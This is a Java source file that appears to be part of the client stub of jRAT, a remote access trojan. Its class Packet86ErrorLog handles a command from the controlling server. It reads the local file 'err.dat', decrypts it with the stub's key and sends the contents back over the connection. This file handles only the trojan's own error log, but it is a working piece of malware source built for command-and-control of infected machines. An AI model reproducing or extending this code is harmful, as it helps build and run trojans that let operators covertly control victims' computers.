package pro.jrat.stub.packets.incoming;

import java.io.FileInputStream;

import pro.jrat.stub.Connection;
import pro.jrat.stub.Main;
import pro.jrat.stub.packets.outgoing.Packet65ErrorLog;
import pro.jrat.stub.utils.Utils;

import com.redpois0n.common.crypto.Crypto;


public class Packet86ErrorLog extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		try {
			FileInputStream in = new FileInputStream("err.dat");
			String str = Utils.readString(in);
			in.close();

			Connection.addToSendQueue(new Packet65ErrorLog(Crypto.decrypt(str, Main.getKey())));
		} catch (Exception ex) {
			Connection.addToSendQueue(new Packet65ErrorLog("Could not load error log file: err.dat: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
		}
	}

}
